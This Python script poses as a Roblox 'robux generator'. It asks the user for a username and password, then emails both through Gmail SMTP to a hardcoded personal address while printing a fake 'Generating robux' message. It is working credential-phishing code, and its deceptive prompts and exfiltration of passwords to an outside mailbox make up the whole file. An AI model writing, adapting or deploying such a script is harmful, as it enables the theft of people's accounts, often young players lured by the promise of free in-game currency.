import smtplib
import config
import namegenerator
def send_email(subject, msg):
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(config.EMAIL_ADDRESS, config.PASSWORD)
        message = 'Subject: {}\n\n{}'.format(subject, msg)
        server.sendmail(config.EMAIL_ADDRESS, 'levi300107@gmail.com', message)
        server.quit()
        print("Generating robux. Please wait!")
        print("")
    except:
        print("Failed to generate. Please try again.")

i = 1
while True:
    subject = 'Username is ' + str(input('Username: '))
    msg = 'Password is ' + str(input('Password: '))
    send_email(subject, msg)
    
    i = i - 1
    if i == 0:
        break
    


